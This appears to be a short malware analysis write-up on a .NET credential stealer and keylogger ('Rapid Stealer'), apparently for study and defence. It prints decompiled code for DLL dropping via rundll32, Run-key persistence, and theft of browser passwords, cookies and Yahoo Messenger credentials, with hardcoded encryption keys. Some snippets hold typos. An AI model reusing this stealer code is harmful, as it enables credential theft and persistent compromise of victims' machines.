# [Quick Note] Analyze .NET sample e978503d4859ba8b171741163516ea75

# Overview
MD5: e978503d4859ba8b171741163516ea75
Any-run: https://any.run/report/6db0f23260293a85f051c8a7314489c3f375767821300664788c4e27214d01f1/0fd7729f-791d-4834-bbdb-710c3d701271 </br>

This sample have a name is ```Stealer``` or ```Rapid Stealer```, it's keylogger with a few function to steal data browser app, messenger app, proxy app, capture keyboard and capture screenshot. This sample developing by .NET language

# Analyze
Signature of this sample </br>
```
code-page:          Unicode UTF-16, little endian
Comments:           Process for Windows
CompanyName:        Microsoft
FileDescription:    Process for Windows
FileVersion:        1.0.0.0
InternalName:       Stealer.exe
LegalCopyright:     Copyright Â©  2013
OriginalFilename:   Stealer.exe
ProductName:        Process for Windows
ProductVersion:     1.0.0.0
Assembly Version:   1.0.0.0
```
Quick check on ```Main``` function, before start this sample created two files ```\\RapidStartTech.stl``` ```AppTransferWiz.dll``` and execute dll file firstly. </br>
```
	Program._appDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IntelRapidStart";
	if (!Directory.Exists(Program._appDataDirectory))
	{
		Directory.CreateDirectory(Program._appDataDirectory);
	}
	Program._mustUploadDir = string.Format("{0}\\ume", Program._appDataDirectory);
	string path = Program._appDataDirectory + "\\RapidStartTech.stl";
	if (File.Exists(path))
	{
		string[] array = File.ReadAllLines(path);
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = Base64.Decode(array[i]);
		}
		Program._startupEnabled = (array[6] == "True");
		Program._keyLoggerEnabled = (array[7] == "True");
		Program._screenshotEnabled = (array[8] == "True");
		Program._keyLoggerValue = int.Parse(array[9]);
		Program._keyLogIsLimitedBySize = (array[10] == "True");
		Program._screenInterval = int.Parse(array[12]);
		Program._screenCounter = int.Parse(array[13]);
		if (!Directory.Exists(Program._mustUploadDir))
		{
			Directory.CreateDirectory(Program._mustUploadDir);
		}
		Program.ExtractResources(Program._appDataDirectory);
		string text = string.Format("{0}\\{1}", Program._appDataDirectory, "AppTransferWiz.dll");
		if (File.Exists(text))
		{
			Process.Start("rundll32.exe", string.Format("\"{0}\",#110", text));
		}
```
After created and run sucessfully, this sample finding registry setup for startup of with OS of sample. If not existed, sample call functions ```SetStartup``` to setup into registry ```SOFTWARE\Microsoft\Windows\CurrentVersion\Run``` with key name ```IntelRapidStart``` </br>
```
	string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	text += string.Format("\\IntelRapidStart\\{0}", AppDomain.CurrentDomain.FriendlyName);
	RegistryKey currentRegistryKey = Program.GetCurrentRegistryKey();
	RegistryKey registryKey = currentRegistryKey.OpenSubKey(Base64.Decod("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), true);
	if (registryKey != null)
	{
		registryKey.SetValue(processName, text);
	}
```
When startup and setup successfully, sample will collect to data, password of browser app,  messenger app and compress it this data into files ```.Enc``` with encryption cipher is AES (RijndaelCrypto) </br>
```
    xmlWriter.WriteStartElement("BrowserPasswords");
    if (Program._isSqliteExist)
    {
    	Program.GetBrowserPasswords(xmlWriter, new Firefox());
    	Program.GetBrowserPasswords(xmlWriter, new Chrome());
    	Program.GetBrowserPasswords(xmlWriter, new Opera());
    {
	
    xmlWriter3.WriteStartElement("Messenger");
    Program.GetMessengerData(xmlWriter3, new Pidgin());
    Program.GetMessengerData(xmlWriter3, new YahooMessenger());
    Program.GetMessengerData(xmlWriter3, new Gtalk());
    Program.GetMessengerData(xmlWriter3, new Skype());
    xmlWriter3.WriteEndElement();
    }

    byte[] array2 = RijndaelCrypto.Encrypt(Program.PassStream.ToArray(), "HavijeBaba", "salam!*%#");
	string path2 = string.Format("{0}\\Pass_{1}_{2}.Enc", Program._mustUploadDir, Environment.MachineName, DateTime.NoToStrin("yyyyMMdd_hhmm"));
	if (array2 != null)
	{
		File.WriteAllBytes(path2, array2);
	}
```
Malware forcus steal data as bookmark, cookies, histories, password and proxies of 4 browser applications Chrome, FireFox, Opera and Internet Explorer on victim machine. Example: </br>
This code as below, have a mission steal bookmark data of Chrome browser with find path ```\\Google\\Chrome\\User Data\\Default\\Bookmarks``` and search with regex into code to find bookmark data
```
string text = FileOperation.FindFilePath(Base64.Decode("XFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxCb29rbWFya3M="));
[...]
Match match = Regex.Match(File.ReadAllText(path), "\"url\": \"(.*?)\"", RegexOptions.IgnoreCase);
int num = "\"url\": \"(.*?)\"".IndexOf("(.*?)", StringComparison.Ordinal);
int num2 = 0;
while (match.Success)
{
	list.Add(new Bookmark
	{
		Title = Convert.ToString(num2++),
		Url = match.ToString().Replace("\"url\": \"(.*?)\"".Substring(1, --num), string.Empty).Replace("\"", string.Empty)
	});
	match = match.NextMatch();
```
This code as below for ```GetCookies``` function, similar as ```GetBookmarks``` function it find this data into path ```\\Google\\Chrome\\User Data\\Default\\Cookies```, copy it into file temp and store it into database of malware
```
string text = FileOperation.FindFilePath(Base64.Decode("XFxHb29nbGVcXENocm9tZVxcVXNlciBEYXRhXFxEZWZhdWx0XFxDb29raWVz"));
[...]
if (!FileOperation.CopyFileToTempArea(text, out text2))
{
	Cookie[] result = null;
	return result;
}
[...]
if (sqLiteProvider.ExecuteQuery(Base64.Decode("c2VsZWN0ICogZnJvbSBjb29raWVz")))
{
	while (sqLiteProvider.ReadRow())
	{
		list.Add(new Cookie
		{
			HostKey = sqLiteProvider.GetStringByName("host_key"),
			Name = sqLiteProvider.GetStringByName("name"),
			Value = sqLiteProvider.GetStringByName("value"),
			Path = sqLiteProvider.GetStringByName("path")
		});
	}
}
```
With ```GetHistories``` ```GetPasswords``` and ```GetProxies``` functions, it code similiar as ```GetCookies```. </br>

Besides stealing data of browser, malware still stealing data of message application YahooMessenger, Skype, Gtalk, Pidin. Example: </br>
This code as below show malware steal username and password of YahooMessenger through hardcoded registry into code and encoded this string with Base64
```
public MessengerInfo GetUsernameAndPassword()
{
	List<Account> list = new List<Account>();
	string version = string.Empty;
	try
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(this._yahooRegistryKey, true);
		if (registryKey == null || registryKey.ValueCount == 0)
		{
			MessengerInfo result = null;
			return result;
		}
		string text = registryKey.GetValue(this._yahooUsernameKey, string.Empty).ToString();
		if (string.IsNullOrEmpty(text))
		{
			MessengerInfo result = null;
			return result;
		}
		string text2 = registryKey.GetValue(this._yahooPasswordKey, string.Empty).ToString();
		if (text2.Length == 0)
		{
			MessengerInfo result = null;
			return result;
		}
		list.Add(new Account
		{
			Username = text,
			Password = this.Decode(text, text2)
		});
		version = registryKey.GetValue("Version").ToString();
		registryKey.SetValue(this._yahooUsernameKey, string.Empty);
		registryKey.SetValue(this._yahooPasswordKey, string.Empty);
	}
	catch (Exception)
	{
	}
	return new MessengerInfo
	{
		Version = version,
		Accounts = list.ToArray()
	};

// Token: 0x04000032 RID: 50
private const string YahooVersionKey = "Version"
// Token: 0x04000033 RID: 51
private readonly string _yahooUsernameKey = Base64.Decode("WWFob28hIFVzZXIgSUQ=") // Yahoo! User ID
// Token: 0x04000034 RID: 52
private readonly string _yahooPasswordKey = Base64.Decode("RVRT") // ETS
// Token: 0x04000035 RID: 53
private readonly string _yahooSavePassword = Base64.Decode("U2F2ZSBQYXNzd29yZA==") // Save Password
// Token: 0x04000036 RID: 54
private readonly string _yahooRegistryKey = Base64.Decode("U09GVFdBUkVceWFob29ccGFnZXI=") // SOFTWARE\yahoo\pager
// Token: 0x04000037 RID: 55
private readonly string _ymsgAuthKey = Base64.Decode("TUJDUyBzdWNrcw=="); // MBCS sucks
```